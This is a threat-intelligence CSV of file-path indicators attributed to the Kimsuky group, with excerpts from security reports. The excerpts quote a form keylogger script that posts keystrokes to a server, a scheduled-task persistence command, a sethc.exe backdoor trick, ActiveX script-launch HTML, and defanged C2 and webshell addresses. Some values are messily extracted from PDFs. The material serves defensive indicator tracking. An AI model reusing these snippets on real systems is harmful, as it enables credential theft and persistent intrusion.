1.0.0,actor--kimsuky,artifact--sha256:b47f4318414a40a2b6d1d2dd1315b988f46a46174682a8efcf9bab26445110fb,observation--sha256:4aa080df0c1f62c2931e35e9ab911db56fc89b96e1af72ed8e7a75427ec4786c,file-path,C:\Users\DefaultUser\Downloads\4\RdpScanM  ain_La_1226.exe,C:\Users\DefaultUser\Downloads\4\RdpScanM ain_La_1226.exe,candidate,2023-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 53}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"53 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsx6519.php HackTool/Win.RdpScan.R437610 Second, 27.255.***.***, where the webshell URL is mapped, is the IP assigned to this host and is an IP band frequently used by the Kimsuky organization when building C2. 27.255.80.170(KR) hxxps://a1ive.info/tygygvftsfx8g68Gu8 x7s78gsx6.php 2023-04-13 3 4 I used it. In the table below (Table 24), excluding webshell URLs 14 and 15, three patterns can be found in webshell URLs 1 to 13. C:\Users\DefaultUser\D",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:db3785df13d1bfdb37c08907dcf39496eccf25c04f78454b5fbeb596bfcafa82,observation--sha256:80bbc6cc5f25e6949f5e5e26eae949794b90f03baf52409aaf9ebec99e3f6b19,file-path,C:\Users\DefaultUser\Downloads\KPortScan3.0,C:\Users\DefaultUser\Downloads\KPortScan3.0,candidate,2023-04-08T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 52}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22:01:12 is. This means that the domestic transit point (KR) where this vulnerability exists was hacked through a system hacked by the Kimsuky organization. Since it can be difficult to specify , if ""(Table 4) RDP (CVE-2019-0708) Vulnerability Scanner List"" and ""(Table 5) Public Program List"" are found together during a breach investigation, you can suspect that it is a Kimsuky organization. 22:00:45 HackTool/Win.RdpScan.R437610 KPortScan3.exe, shown in light yellow, will also be released in C2 ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:80501c53fdbb985e9d025f078f7a7825cf4203c25432d0bca600dc0dbde89c7a,observation--sha256:d5a9727110b086a5696a75c53f4b3e29b2796dd56cf55c0735741506ef13d270,file-path,C:\Users\DefaultUser\Downloads\RdpAttack_LA,C:\Users\DefaultUser\Downloads\RdpAttack_LA,candidate,2023-04-08T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 52}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22:01:12 is. This means that the domestic transit point (KR) where this vulnerability exists was hacked through a system hacked by the Kimsuky organization. Since it can be difficult to specify , if ""(Table 4) RDP (CVE-2019-0708) Vulnerability Scanner List"" and ""(Table 5) Public Program List"" are found together during a breach investigation, you can suspect that it is a Kimsuky organization. 22:00:45 HackTool/Win.RdpScan.R437610 KPortScan3.exe, shown in light yellow, will also be released in C2 ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:40002823bdc0d196f72d3b1b38f2409492f3d4485d4c61b19c30fcf323cbb163,observation--sha256:d5f2fd135f23c0c0e15c7a01c2382820129fa61b31cd09fb3d3d02293a770268,file-path,C:\Users\DefaultUser\Downloads\data\ms_x64.dll,C:\Users\DefaultUser\Downloads\data\ms_x64.dll,candidate,2023-04-08T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 52}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22:01:12 is. This means that the domestic transit point (KR) where this vulnerability exists was hacked through a system hacked by the Kimsuky organization. Since it can be difficult to specify , if ""(Table 4) RDP (CVE-2019-0708) Vulnerability Scanner List"" and ""(Table 5) Public Program List"" are found together during a breach investigation, you can suspect that it is a Kimsuky organization. 22:00:45 HackTool/Win.RdpScan.R437610 KPortScan3.exe, shown in light yellow, will also be released in C2 ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0a8c3a094f46d3dc40a4af3c522ddb6236dd41bf7026bbf521ed4b946d2734c2,observation--sha256:d7bf5750bd1a07363903ba5cc6d51893be062f28fbfc080acdd5d457c5592745,file-path,C:\Users\DefaultUser\Downloads\info_sc_org1  -,C:\Users\DefaultUser\Downloads\info_sc_org1 -,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 79}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 61) Example of files created in the Check folder Trojan/VBS.Kimsuky Trojan/VBS.Akdoor.S2202 Below (Table 46) is the diagnosis made by the antivirus installed by the Kimsuky organization when testing malware in 17*.11*.22*.18*(US). C:\Users\DefaultUser\Downloads\info_sc_org1 - 20230321053830 C:\Users\Administrator\Downloads\passwod.txt.lnk e\16.0\Exported\{015223D7-1E1C-4B92-9ED7- Even if you enter an incorrect parameter value, the file is not deleted. Like list.php, it is determined by t",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d678d81dea3b795de155c10665c2bdb4458e6eb799c62023d61ef7d5e9a70107,observation--sha256:e9fe086866c75d85262d973b06d6207e3dac43b289cc9ddcc723757a86de58b8,file-path,C:\Users\DefaultUser\Downloads\info_sc_org1.txt,C:\Users\DefaultUser\Downloads\info_sc_org1.txt,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 79}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 61) Example of files created in the Check folder Trojan/VBS.Kimsuky Trojan/VBS.Akdoor.S2202 Below (Table 46) is the diagnosis made by the antivirus installed by the Kimsuky organization when testing malware in 17*.11*.22*.18*(US). C:\Users\DefaultUser\Downloads\info_sc_org1 - 20230321053830 C:\Users\Administrator\Downloads\passwod.txt.lnk e\16.0\Exported\{015223D7-1E1C-4B92-9ED7- Even if you enter an incorrect parameter value, the file is not deleted. Like list.php, it is determined by t",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7405b98da63de66fa3f5d10b06f61f7d84fcf88fd5ac273aabc662a3656bb598,observation--sha256:d8bc64bdda3f1efacf381246b34d40e8f58ff51ed7884c7ba45c7d5ae59e1f78,file-path,C:\Users\DefaultUser\Downloads\ms_x64.dll,C:\Users\DefaultUser\Downloads\ms_x64.dll,candidate,2023-04-08T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 52}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22:01:12 is. This means that the domestic transit point (KR) where this vulnerability exists was hacked through a system hacked by the Kimsuky organization. Since it can be difficult to specify , if ""(Table 4) RDP (CVE-2019-0708) Vulnerability Scanner List"" and ""(Table 5) Public Program List"" are found together during a breach investigation, you can suspect that it is a Kimsuky organization. 22:00:45 HackTool/Win.RdpScan.R437610 KPortScan3.exe, shown in light yellow, will also be released in C2 ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:dbccfd0dadfc6c7004233c721acbbd10c72bec8637c7e0f6763f1ebc07cf5529,observation--sha256:3137b9839727f4d6d5f4dae88d5e51284aa1a45a491c65c522d620a380feea81,file-path,C:\Users\Public\Libraries\Docs.jse,C:\Users\Public\Libraries\Docs.jse,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:a899d92bafc7d11e1b23df9c8f655301c17dd33f185bade9a3531d123507d4d1,observation--sha256:fd1d2fadc72cf5be5855897c46635cef903dbd98b6df9eee42e188ba61d8c466,file-path,"C:\Users\Public\Libraries” 경로에디컴파일합니다. 이후, 디컴파일을통해추출된악성Docs.jse파일을wscript.exe 로실행합니다.","C:\Users\Public\Libraries” 경로에디컴파일합니다. 이후, 디컴파일을통해추출된악성Docs.jse파일을wscript.exe 로실행합니다",candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 11}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 3.2. sgic_info.html ○CHM파일을실행할경우, 내부에포함되어있는HTML파일이실행됩니다.이때, HTML파일의하단에존재하는악성스크립트가윈도우도움말실행프로그램인hh.exe 를통해CHM파일을“C:\Users\Public\Libraries” 경로에디컴파일합니다. 이후, 디컴파일을통해추출된악성Docs.jse파일을wscript.exe 로실행합니다. [그림3-4] HTML내부스크립트 [그림3-5] 디컴파일탐지 Genians SecurityCenter 10",
1.0.0,actor--kimsuky,artifact--sha256:c33b84ead370a4aaf58a27c68ea155bc1eee9d2774f076af1413ab765adf24e9,observation--sha256:d2d90f6020e4e647dfa059681684ffb458cb4918828ae49d0996cca70af4e731,file-path,C:\Windows\..\ProgramData\ = C:\ProgramData\,C:\Windows\..\ProgramData\ = C:\ProgramData\,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 In another example of JavaScript execution of Kimsuky AppleSeed malware, Rapid7 observed use of double base64 encoding of both payload and lure. In this case execution contained an ActiveX decode and the well known lolbin certutil. Some other examples used in this javascript: • Simple string concatenation to obfuscate detection efforts • Variable substitution • Simple folder traversal e.g C:\Windows\..\ProgramData\ = C:\ProgramData\ • Embedded files double base64 encoded — ActiveX decode and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:060d3a3c5539c143b9aaf22397dcb5df3ddc29b8adff5ad2ef4171be41dcfcb4,observation--sha256:3e1a7defdaa77ed46c692a5eb60d90bbe1a04be3775bff9c8ec14a5db6bdc342,file-path,C:\Windows\SysWOW64\config\systemprofile\AppData\Roaming\winlogon.exe,C:\Windows\SysWOW64\config\systemprofile\AppData\Roaming\winlogon.exe,candidate,2023-07-29T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Below (Table 8) is an excerpt of only the logs related to BlackBit ransomware among the logs collected from the system hacked by the Kimsuky organization. It summarizes five reasons for determining that the organization intentionally executed BlackBit ransomware. (KR) initial diagnosis 2023-07-29 29 AhnLab's antivirus V3 has the “Use behavior-based diagnosis and Use ransomware security folder” option to respond to ransomware , and using this option can minimize damage caused by ransomware infect",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f30b1130ac64a4e4290d5cc2612e638beda5c78266947ef2be8f9488ed24f9fc,observation--sha256:7b9d42bf1a5473deddadddb2f378b9623542a62881b64fcb12aaa53903b818e7,file-path,C:\Windows\System32\termsvc.dll,C:\Windows\System32\termsvc.dll,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 79}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 61) Example of files created in the Check folder Trojan/VBS.Kimsuky Trojan/VBS.Akdoor.S2202 Below (Table 46) is the diagnosis made by the antivirus installed by the Kimsuky organization when testing malware in 17*.11*.22*.18*(US). C:\Users\DefaultUser\Downloads\info_sc_org1 - 20230321053830 C:\Users\Administrator\Downloads\passwod.txt.lnk e\16.0\Exported\{015223D7-1E1C-4B92-9ED7- Even if you enter an incorrect parameter value, the file is not deleted. Like list.php, it is determined by t",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:63157b9731e24dd2d01482c1d107fc39ff1a29702c42bb645e53a6e4a0e87f3a,observation--sha256:acaeb71475d9a42676e80fd3f7a37a124dc3ac508b74570da27877d38ab54466,file-path,C:\Windows\system32\comhost.exe。,C:\Windows\system32\comhost.exe。,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 5}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 3.2 第二阶段：木马安装 攻击者前后开发了多个类似的木马，作者观察到在部分组件中携带有 Pdb 路径，疑似 多名开发者协同工作。 D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\splwow64_poc.pdb D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\CreateDC.pdb I:\splwow64_poc\x64\Release\DLL.pdb C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.,
1.0.0,actor--kimsuky,artifact--sha256:8e40bc37fe0d009ba1c5a18498e8b3ed135e814f99c9c0b4ce8f038d5aedbfb5,observation--sha256:fda4160b136dfe88a1a0633caf161f8d15bc3b3d9f55fd4f322ba0aa9db9e356,file-path,C:\Windows\system32\regsvr32.exe/s,C:\Windows\system32\regsvr32.exe/s,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 11}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 11VIRUS BULLETIN CONFERENCE OCTOBER 2021 Stage 02: bootstrap.js?_=[BASE64(ID)]&token=[BASE64(Target)]=&m=login (Web page newly moved by iframe.) <script> </script><scripttype=""text/javascript""> $(function(){ functionsend(value=""""){ $.ajax({ url:""ga.js"", type:""post"", data:{ _:""[BASE64(ID)]"", token:btoa(value) } }); } $(""input"").keydown(function(evt) { send(""keydown:""+evt.target.value); }); $(""input"").change(function(evt) {",
1.0.0,actor--kimsuky,artifact--sha256:8e40bc37fe0d009ba1c5a18498e8b3ed135e814f99c9c0b4ce8f038d5aedbfb5,observation--sha256:fc05476b3ae260728a39209001a355501ba290232c0de9a112911aa83c8a98ae,file-path,C:\Windows\system32\regsvr32.exe/s,C:\Windows\system32\regsvr32.exe/s,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:8e40bc37fe0d009ba1c5a18498e8b3ed135e814f99c9c0b4ce8f038d5aedbfb5,observation--sha256:c566058ba007f7e2880ca7e5f4b27d6ea18166e2ae1f1afb17cb05f61783e392,file-path,C:\Windows\system32\regsvr32.exe/s,C:\Windows\system32\regsvr32.exe/s,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 15}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 15VIRUS BULLETIN CONFERENCE OCTOBER 2021  Mutex name - windows update server real time mui cache - windows update {2020-1050-01-01-0001-I}  Scheduler - schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\ Driverdriver.cfg""""/sc minute /mo30  The path to the file is finally downloaded and executed - %APPDATA%\Roaming\Intel\DriverSoftware\Microsoft\Windows\Defender  C&C add",
1.0.0,actor--kimsuky,artifact--sha256:8ff38eb8f49e7765502f9477f2828331b552d506c6d7a8a0cdef9ee03307bbd3,observation--sha256:03639ccd0cb365717c83e57c11a55a946e970966896f907755c640d33fa4b57a,file-path,C:\Windows\winlogon.exe,C:\Windows\winlogon.exe,candidate,2023-07-29T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Below (Table 8) is an excerpt of only the logs related to BlackBit ransomware among the logs collected from the system hacked by the Kimsuky organization. It summarizes five reasons for determining that the organization intentionally executed BlackBit ransomware. (KR) initial diagnosis 2023-07-29 29 AhnLab's antivirus V3 has the “Use behavior-based diagnosis and Use ransomware security folder” option to respond to ransomware , and using this option can minimize damage caused by ransomware infect",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8ff38eb8f49e7765502f9477f2828331b552d506c6d7a8a0cdef9ee03307bbd3,observation--sha256:efa2a7c27d4d8e0194bec9d0d7b9eadc8ebfe30f70fa43c1a874470e27cd14ca,file-path,C:\Windows\winlogon.exe,C:\Windows\winlogon.exe,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:59d434b5f96e096b8664866a6760a5add6399c922ec670d355a67dd8619614ea,observation--sha256:818a187a81256f069358398ff649fb2b12b0101eed6609516f469d8e72ea906c,file-path,C:\\ProgramData\\Software\\Microsoft\\Windows\\MDF\\WDFSync\\WDFSync.dll,C:\\ProgramData\\Software\\Microsoft\\Windows\\MDF\\WDFSync\\WDFSync.dll,candidate,2021-05-07T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 源 RAT 样本发现，该样本使用的 C2 服务器与上述服务器被解析为同一个 IP 地址（104.1 28.239.70）。 MD5 c861f25bb943f77a909b33d62bb71926 SHA1 576b953cb4fe71adb71a338a42524b0e424824c1 SHA256 fd59597169668b90c47d0ad6db1bcd7d778c6d54ee3c42bdd2d86b2d2d34 c885 文件大小 485888 字节 (474.50 KB) 文件格式 PE64 DLL 编译时间 2021/05/07 05:06:47 C&C anto.shore.ml 通过 regsvr32.exe 启动该 RAT，并调用恶意流程入口点 DllRegisterServer。 图[9].RAT 模块的导出表 执行后首先进行安装流程，自我复制到以下目录： C:\\ProgramData\\Software\\Microsoft\\Windows\\MDF\\WDFSync,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9c1fddd2972a8d7fa0b582d283fbcd703a5e6893671128b83c6eb0760f90079f,observation--sha256:2e812a7bb22bab0546bd26c49755ed562c69426f0327f815b479ee342d09b0f7,file-path,C:\\Users\\Public\\Libraries\\Docs.jseP,C:\\Users\\Public\\Libraries\\Docs.jseP,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 56}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport </SCRIPT> inner;A.Click(); inner ='<OBJECTid=""B""classid=""clsid:52a2aaae-085d-4187-97ea-8c30db990436"" style=""visibility:hidden"">';inner +='<PARAMname=""Command""value=""ShortCut""><PARAMname=""Button""value=""Bitmap:shortcut"">';inner +='<PARAMname=""Item1""value="",wscript,C:\\Users\\Public\\Libraries\\Docs.jseP""><PARAMname=""Item2""value=""273,1,1""></OBJECT>';document.getElementById('par').innerHTML=inner;B.Click(); </script> [표4-3] HTML코드유사도 4.10. Powershell 코드유사도 ○VBS 와JSE 유형모두Pow",
1.0.0,actor--kimsuky,artifact--sha256:98c7c7734e9d33c35dce177f0b751401ebe721a6f17b47609b44add41f46ca03,observation--sha256:017df79df2e2578b7eb8083b0865d6625850717dd283be2fd07d7bc28c84dfb6,file-path,D:\MyWork\PrevWork\ 취 약 점 자 료,D:\MyWork\PrevWork\ 취 약 점 자 료,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 5}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 3.2 第二阶段：木马安装 攻击者前后开发了多个类似的木马，作者观察到在部分组件中携带有 Pdb 路径，疑似 多名开发者协同工作。 D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\splwow64_poc.pdb D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\CreateDC.pdb I:\splwow64_poc\x64\Release\DLL.pdb C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.,
1.0.0,actor--kimsuky,artifact--sha256:4ca49abbb97285639e443f70bf01b7f4feb8481fbd49c3e415ce514db2cccab8,observation--sha256:01ee7392257721835895f00ef62c62fb6e5eaf102f616d5e1a47f169a1405b4c,file-path,D:\MyWork\PrevWork\취약점자료,D:\MyWork\PrevWork\취약점자료,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 15}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 d726d8ee222ab6855e4486cbba671827489de312e56966dd71a289098244c752 e4aef7e31a4169d2dc4356502e3ab2bc3009d32cf95e8357a58a82dfd4b17878 5cca00063272921043ccbf1bc9aa434a438078b317b1b168840abbbc8b97fd68 dbe5d2dfe2cabb40c2ce1c1127297094b41734daf33e9308b742c72eb2185b70 Pdb D:\MyWork\PrevWork\취약점자료\IE\2021\Work\Final\splwow64_poc\x64\Release\splwo w64_poc.pdb D:\MyWork\PrevWork\취약점자료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\C,
1.0.0,actor--kimsuky,artifact--sha256:730954e68e561374da41c99fc703bef8cf6f94aafb1cf834f51a5af9d9422812,observation--sha256:b2137ee8f1d030d63bbd81c0d97c8092885a4fbd96f7b41e1fe034952eeaaeef,file-path,D:\MyWork\PrevWork\취약점자료\IE\2021\Work\Final\splwow64_poc\x64\Release\splwo,D:\MyWork\PrevWork\취약점자료\IE\2021\Work\Final\splwow64_poc\x64\Release\splwo,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 15}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 d726d8ee222ab6855e4486cbba671827489de312e56966dd71a289098244c752 e4aef7e31a4169d2dc4356502e3ab2bc3009d32cf95e8357a58a82dfd4b17878 5cca00063272921043ccbf1bc9aa434a438078b317b1b168840abbbc8b97fd68 dbe5d2dfe2cabb40c2ce1c1127297094b41734daf33e9308b742c72eb2185b70 Pdb D:\MyWork\PrevWork\취약점자료\IE\2021\Work\Final\splwow64_poc\x64\Release\splwo w64_poc.pdb D:\MyWork\PrevWork\취약점자료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\C,
1.0.0,actor--kimsuky,artifact--sha256:b997a901fdead6383f3a636b19d92c16e975e56d25826bd5020c03eaf2228972,observation--sha256:707d4bbba98f23196df5e4ca6a03b6864148b277c4a84e8d9baf2fb917c0f836,file-path,D:\Work  folder.,D:\Work folder,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Information related to this is described in “(4-3) C2 Management and Operations.” Since it contains information about the file, it can be used as a reference when analyzing the file, and you can check meaningful information in the PDB path. can. For example, in Table 4 below, the string vs15 commonly included in PDB information is used by the Kimsuky organization. r_sethc_x64.ex (Table 3) Comparison of strings in r_sethc_x64.exe with original source It exists within a function that does not work",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9568aa43df41d375d5dbd1ae7dc2714a46b065e7a25b34f5a5972f15d0e1a53c,observation--sha256:5ee2db6bef98e86c052b8af857f3e65e675fa94070f3d8dc2ff0e4fdba43036d,file-path,D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r,D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
